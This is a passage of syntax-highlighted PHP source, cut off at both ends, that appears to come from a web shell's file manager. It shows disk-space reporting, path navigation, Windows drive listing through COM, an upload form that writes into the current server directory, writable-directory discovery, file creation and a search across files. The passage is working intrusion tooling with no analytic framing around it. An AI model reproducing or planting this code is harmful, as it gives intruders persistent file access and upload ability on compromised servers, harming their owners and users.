<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'getsize'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'getdir'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">free</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">disk_free_space(</span>$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">free</span> &amp;&amp; $<span style="color: #eab700;">free</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">all</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">disk_total_space(</span>$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">all</span> &amp;&amp; $<span style="color: #eab700;">all</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">used</span> = $<span style="color: #eab700;">all</span>-$<span style="color: #eab700;">free</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>$<span style="color: #eab700;">free</span>).<span style="color: #3e999f;">' of '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.@</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">round(100</span><span style="text-decoration: underline;">/($</span><span style="color: #eab700; text-decoration: underline;">all</span><span style="text-decoration: underline;">/$</span><span style="color: #eab700; text-decoration: underline;">free</span><span style="text-decoration: underline;">),</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">2</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cwd_links</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">path</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">n</span>=<span style="color: #4d4d4c; background-color: #ffffff;">count(</span>$<span style="color: #eab700;">path</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;$<span style="color: #eab700;">i</span>&lt;$<span style="color: #eab700;">n</span>-<span style="color: #4d4d4c; background-color: #ffffff;">1</span>;$<span style="color: #eab700;">i</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cwd_links</span> .= <span style="color: #3e999f;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">j</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;$<span style="color: #eab700;">j</span>&lt;=$<span style="color: #eab700;">i</span>;$<span style="color: #eab700;">j</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cwd_links</span> .= $<span style="color: #eab700;">path</span>[$<span style="color: #eab700;">j</span>].<span style="color: #3e999f;">'/'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cwd_links</span> .= <span style="color: #3e999f;">'\');"&gt;'</span>.$<span style="color: #eab700;">path</span>[$<span style="color: #eab700;">i</span>].<span style="color: #3e999f;">'/&lt;/a&gt;'</span>;
<span style="background-color: #d6d6d6;"> </span>   }

<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;script</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"text/javascript"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #c82829; font-weight: bold;">document</span>.<span style="color: #c82829; font-weight: bold;">onclick</span> = <span style="color: #c82829; font-weight: bold;">shownav</span>;
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">shownav</span>(<span style="color: #c82829; font-weight: bold;">e</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">src</span> = <span style="color: #c82829; font-weight: bold;">e</span>?<span style="color: #c82829; font-weight: bold;">e</span>.<span style="color: #c82829; font-weight: bold;">target</span>:<span style="color: #c82829; font-weight: bold;">event</span>.<span style="color: #c82829; font-weight: bold;">srcElement</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">do</span>{
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">src</span>.<span style="color: #c82829; font-weight: bold;">id</span> ==<span style="color: #3e999f;">"jumpto"</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'inputnav'</span>).<span style="color: #c82829; font-weight: bold;">style</span>.<span style="color: #c82829; font-weight: bold;">display</span> = <span style="color: #3e999f;">""</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'pathnav'</span>).<span style="color: #c82829; font-weight: bold;">style</span>.<span style="color: #c82829; font-weight: bold;">display</span> = <span style="color: #3e999f;">"none"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">hidenav();</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">src</span>.<span style="color: #c82829; font-weight: bold;">id</span> ==<span style="color: #3e999f;">"inputnav"</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">src</span> = <span style="color: #c82829; font-weight: bold;">src</span>.<span style="color: #c82829; font-weight: bold;">parentNode</span>;
<span style="background-color: #d6d6d6;"> </span>   }<span style="color: #718c00;">while</span>(<span style="color: #c82829; font-weight: bold;">src</span>.<span style="color: #c82829; font-weight: bold;">parentNode</span>)

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'inputnav'</span>).<span style="color: #c82829; font-weight: bold;">style</span>.<span style="color: #c82829; font-weight: bold;">display</span> = <span style="color: #3e999f;">"none"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'pathnav'</span>).<span style="color: #c82829; font-weight: bold;">style</span>.<span style="color: #c82829; font-weight: bold;">display</span> = <span style="color: #3e999f;">""</span>;
}
<span style="color: #4271ae;">&lt;/script&gt;</span>
<span style="color: #4271ae;">&lt;div</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"background:#eee;margin-bottom:10px;"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;table</span> <span style="color: #4271ae;">id=</span><span style="color: #3e999f;">"pathnav"</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span> <span style="color: #4271ae;">border=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">cellpadding=</span><span style="color: #3e999f;">"5"</span> <span style="color: #4271ae;">cellspacing=</span><span style="color: #3e999f;">"0"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;tr&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span><span style="color: #4271ae;">&gt;</span><span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">cwd_links</span>.<span style="color: #3e999f;">' - '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">nowpath</span>).<span style="color: #3e999f;">' / </span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">getPerms(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">getUser(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #718c00; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #eab700; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #4271ae; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td</span> <span style="color: #c82829; font-weight: bold;">nowrap</span><span style="color: #4271ae;">&gt;&lt;input</span> <span style="color: #4271ae;">class=</span><span style="color: #3e999f;">"bt"</span> <span style="color: #4271ae;">id=</span><span style="color: #3e999f;">"jumpto"</span> <span style="color: #4271ae;">name=</span><span style="color: #3e999f;">"jumpto"</span> <span style="color: #4271ae;">value=</span><span style="color: #3e999f;">"Jump t</span><span style="color: #3e999f; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">type=</span><span style="color: #3e999f; text-decoration: underline;">"button"</span><span style="color: #4271ae; text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/tr&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/table&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;table</span> <span style="color: #4271ae;">id=</span><span style="color: #3e999f;">"inputnav"</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span> <span style="color: #4271ae;">border=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">cellpadding=</span><span style="color: #3e999f;">"5"</span> <span style="color: #4271ae;">cellspacing=</span><span style="color: #3e999f;">"0"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">style=</span><span style="color: #3e999f; text-decoration: underline;">"display:none;"</span><span style="color: #4271ae; text-decoration: underline;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;form</span> <span style="color: #4271ae;">action=</span><span style="color: #3e999f;">""</span> <span style="color: #4271ae;">method=</span><span style="color: #3e999f;">"post"</span> <span style="color: #4271ae;">id=</span><span style="color: #3e999f;">"godir"</span> <span style="color: #4271ae;">name=</span><span style="color: #3e999f;">"godir"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;tr&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td</span> <span style="color: #c82829; font-weight: bold;">nowrap</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Current</span> <span style="color: #4d4d4c; background-color: #ffffff;">Directory (</span><span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">dir_writeable</span>;<span style="color: #8959a8;">?&gt;</span>, <span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">ec</span><span style="color: #718c00; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">getChmod(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #4271ae; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span><span style="color: #4271ae;">&gt;&lt;input</span> <span style="color: #4271ae;">name=</span><span style="color: #3e999f;">"view_writable"</span> <span style="color: #4271ae;">value=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"hidden"</span><span style="text-decoration: underline;"> /</span><span style="color: #4271ae; text-decoration: underline;">&gt;&lt;input</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">class=</span><span style="color: #3e999f; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">name=</span><span style="color: #3e999f; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">value=</span><span style="color: #3e999f; text-decoration: underline;">"&lt;?php echo $nowpath;?&gt;"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">type=</span><span style="color: #3e999f; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">style=</span><span style="color: #3e999f; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #4271ae; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td</span> <span style="color: #c82829; font-weight: bold;">nowrap</span><span style="color: #4271ae;">&gt;&lt;input</span> <span style="color: #4271ae;">class=</span><span style="color: #3e999f;">"bt"</span> <span style="color: #4271ae;">value=</span><span style="color: #3e999f;">"GO"</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"submit"</span><span style="color: #4271ae;">&gt;&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/tr&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/form&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/table&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">obj</span> = <span style="color: #718c00;">new</span> <span style="color: #4271ae;">COM</span>(<span style="color: #3e999f;">'scripting.filesystemobject'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">obj</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_object(</span>$<span style="color: #eab700;">obj</span>) &amp;&amp; $<span style="color: #eab700;">obj</span>-<span style="color: #4271ae;">&gt;</span><span style="color: #eab700;">Drives</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">DriveTypeDB</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(0</span> =&gt; <span style="color: #3e999f;">'Unknow'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">1</span> =&gt; <span style="color: #3e999f;">'Removable'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">2</span> =&gt; <span style="color: #3e999f;">'Fixed'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">3</span> =<span style="text-decoration: underline;">&gt; </span><span style="color: #3e999f; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">4</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #3e999f; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">5</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #3e999f; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">comma</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">obj</span>-&gt;<span style="color: #eab700;">Drives</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">drive</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">drive</span>-&gt;<span style="color: #eab700;">Path</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">comma</span>.<span style="color: #3e999f;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #eab700;">drive</span>-<span style="color: #4271ae;">&gt;</span><span style="color: #eab700;">Path</span>.<span style="color: #3e999f;">'/\');"</span><span style="color: #3e999f; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #eab700; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #eab700; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">comma</span> = <span style="color: #3e999f;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">'&lt;/div&gt;'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;/div&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">findstr</span> = $<span style="color: #4271ae;">_POST</span>[<span style="color: #3e999f;">'findstr'</span>];
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">re</span> = $<span style="color: #4271ae;">_POST</span>[<span style="color: #3e999f;">'re'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">tbhead(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #3e999f; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">"DOCUMENT_ROOT"</span>].<span style="color: #3e999f;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #3e999f; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #eab700;">nowpath</span>.<span style="color: #3e999f;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #eab700;">nowpath</span>.<span style="color: #3e999f;">'\',\'dir\');"&gt;</span><span style="color: #3e999f; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #eab700;">nowpath</span>.<span style="color: #3e999f;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #3e999f; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="POST"&gt;Find s</span><span style="color: #3e999f; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.($</span><span style="color: #eab700; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #3e999f; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #3e999f; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">view_writable</span> == <span style="color: #3e999f;">'dir'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">GetWDirList(</span>$<span style="color: #eab700;">nowpath</span>);
